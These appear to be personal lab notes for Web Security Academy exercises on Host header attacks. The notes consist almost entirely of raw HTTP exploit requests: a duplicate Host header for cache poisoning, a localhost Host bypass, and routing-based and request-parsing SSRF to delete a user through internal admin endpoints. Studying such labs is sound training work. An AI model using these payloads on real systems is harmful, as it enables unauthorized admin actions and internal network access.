## Lab: Web cache poisoning via ambiguous requests

```
GET / HTTP/1.1
Host: 0ae500190468251680a7038300e7008e.h1-web-security-academy.net
Host: exploit-0a4800aa04d825d7804e0281018d00fd.exploit-server.net
Cookie: _lab=46%7cMCwCFDrl5cjW8%2bQeYb%2f97MFhqntSq2SwAhQy0MTecj3dGuWFBJ0ad63Hw7usBbyN1PRzhgVFO6qvE2BoxyanDs0jPz9pVAYRrUWR5cFJ5rDvS6rnOko%2fzTDxIXgwjUkt6sUEO5%2f2CJYd3ECa7vC6pujKiqYwhfohSi1Xc3KKS0owkUoaWkI%3d
```

## Lab: Host header authentication bypass

```
GET /admin/delete?username=carlos HTTP/2
Host: localhost
Cookie: session=V3tpToqwdJC8P0yJFqtLrtoIaFmBiY2b; _lab=46%7cMCwCFC7Xs4alrgGuY64owfLXFbvPwDPzAhRZx37wIn8FdSQiycxFgLcWf6xuqFQhxmYKcblFKiW6WELiJx4m1XzhLE16f5w7utQBWEFrjPptDbx4q0LDIIGU4XUO8faFo%2bYfizqMSo98yoPKytnx4nIup555iSn9%2bp8v%2fR94O%2bM%2bh54%3d
```

## Lab: Routing-based SSRF

```
POST /admin/delete HTTP/2
Host: 192.168.0.163
Cookie: session=kRtejMlHrR9SR6lw8WY2LtMJdTr1y16c; _lab=47%7cMC0CFQCWI3HAG26yjPqiOlbea4XgBV5tZgIUJHu0%2bPxqbhphpcJAyom7MTgCRlVCtzcrJcsfBf9625cPT3SdIHu2NjWWe8Dg2Zc3G2lfcNHBL20qnxjHON3yFuJu%2b4blEovCgJVzulyUEInAxg1YlibDlUrRSwES3naIIhI0ocU1ACVM
Sec-Ch-Ua: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://192.168.0.163/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9,en;q=0.8
Priority: u=0, i
Content-Length: 53

csrf=DTDblReIDgjuom2BTNHKZAFZ5HrIATUp&username=carlos
```

## Lab: SSRF via flawed request parsing

```
POST https://0a3100c904bdd8168077fdf5004300e3.web-security-academy.net/admin/delete HTTP/2
Host: 192.168.0.226
Cookie: session=kyDviDK4XTpVqqm9Pimd4hgbsOAsSbUw; _lab=46%7cMCwCFHytarM1582JRVEslPVQ8iPi0uj4AhRUoTt7hvlOWJbmuf4HIOVrPfrU%2f4dYFEwaPW7u4dr%2f5WqlWrfFI0KslMlBT%2fZI9ViO2i2mqr8sfVrCXxUpTs8mVj0Ky6X5GbE5sh0qCKbP5c0s78A9PsAk%2bXajW4jVavGxXxfWS96Dn70%3d
Content-Length: 53

csrf=a8L7n98SaBquVzPCAdCZF0AjhALJToET&username=carlos
```

## Lab: Host validation bypass via connection state attack

Primera 
![[Pasted image 20251117225633.png]]
Segunda
![[Pasted image 20251117225623.png]]